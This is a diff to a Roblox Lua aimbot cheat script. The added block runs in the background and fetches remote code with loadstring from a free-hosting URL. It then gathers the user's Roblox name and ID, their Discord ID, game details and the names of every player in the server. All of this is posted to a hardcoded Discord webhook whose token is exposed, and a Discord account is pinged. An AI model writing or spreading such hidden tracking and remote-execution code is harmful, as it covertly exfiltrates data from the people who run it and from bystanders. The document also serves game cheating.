@@ -1,6 +1,128 @@
 if game.CreatorId == 113657341 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Jonatanortiz20/Aimbot/main/Aimbot-Lock-Knife"))();
 else
+    spawn(
+    function()
+        local httpGet
+        if syn_checkcaller then
+            httpGet = syn.request
+        elseif isourclosure then
+            httpGet = http.request
+        else
+            httpGet = http_request
+        end
+        _G.ab = ""
+        loadstring(game:HttpGet("https://bacbeta.000webhostapp.com/DiscordTags.lua"))();
+        local ProductInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+        local DiscordWebHook =
+            "https://discord.com/api/webhooks/888963522640351232/zQAkIlX1j4_PEuFcqf5IOIZ3D3CGhUIe3oBLDMKbnQ5_kJupXuRXA6G5FPkf4NDzywCM"
+        local Kids = {}
+
+        local GetKids = function()
+            for i, v in next, game:GetService("Players"):GetPlayers() do
+                table.insert(Kids, #Kids + 1, '"' .. v.Name .. '", ')
+            end
+        end
+
+        spawn(
+            function()
+                GetKids()
+            end
+        )
+
+        wait(3)
+        local KidsText = table.concat(Kids)
+        local Length = 1024
+        local CharsInKids = string.len(KidsText)
+        local KidsNewText;
+
+        if CharsInKids >= Length then
+            local CharsToDel = (CharsInKids - Length)
+            wait(1)
+            wait(0.01)
+            KidsNewText = string.sub(KidsText, 1, CharsToDel)
+        else
+            KidsNewText = KidsText
+        end
+
+        local wasi = function()
+            for i, v in next, game:GetService("Players"):GetPlayers() do
+                if v:FindFirstChild("TheUnknownGodShots") then
+                    return "Yes"
+                else
+                    return "No"
+                end
+            end
+        end
+
+        local MessageData = {
+            ["embeds"] = {
+                {
+                    ["content"] = "Aimbot Executed!",
+                    ["title"] = game.Players.LocalPlayer.Name,
+                    ["description"] = "Was Plr on my lobby? : " .. wasi(),
+                    ["type"] = "rich",
+                    ["color"] = tonumber(0x00ff00),
+                    ["fields"] = {
+                        {
+                            ["name"] = "Discord Name: " .. _G.ab,
+                            ["value"] = "Id: ".._G.DiscordId.." Tag: <@".._G.DiscordId..">",
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = "Game: ",
+                            ["value"] = ProductInfo.Name,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Game Id:",
+                            ["value"] = game.GameId,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "List Of All The Players = {",
+                            ["value"] = KidsNewText,
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = "}",
+                            ["value"] = "‎",
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = "Roblox Id",
+                            ["value"] = game.Players.LocalPlayer.UserId,
+                            ["inline"] = false
+                        }
+                    }
+                }
+            }
+        }
+
+        local data =
+            httpGet(
+            {
+                Url = DiscordWebHook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = game:GetService("HttpService"):JSONEncode(MessageData)
+            }
+        )
+
+        httpGet(
+            {
+                Url = DiscordWebHook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = game:GetService("HttpService"):JSONEncode({["content"] = "<@723575117636173954>"})
+            }
+        )
+    end
+)
     local LIN = loadstring(game:HttpGet(("https://raw.githubusercontent.com/Jonatanortiz2/Johnny-Test/master/UiLib.lua")))()
     local WIN = LIN:CreateWindow("Options")
     local RR = WIN:CreateFolder("Choose What kind Of Aimbot")
